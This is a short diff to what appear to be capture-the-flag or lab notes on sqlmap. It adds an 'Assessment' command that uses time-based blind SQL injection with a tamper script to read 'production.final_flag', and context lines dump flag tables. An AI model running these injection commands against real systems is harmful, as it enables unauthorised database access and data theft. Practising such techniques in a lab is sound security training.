@@ -19,6 +19,16 @@ sqlmap -r req.txt --csrf-token="t0ken" --batch -D testdb -T flag8 --dump
 
 # using tamper script
 sqlmap -r req.txt -p "id" --batch -D testdb -T flag11 --dump --tamper=between --flush-session --no-cast
+
+# Assessment
+sqlmap -r req.txt \
+  --batch \
+  --technique=T \
+  --tamper=between \
+  --fresh-queries \
+  --time-sec=5 \
+  --threads=1 \
+  --sql-query="SELECT HEX(content) FROM production.final_flag LIMIT 1"
 ```
 
 ## HTTP Request Type
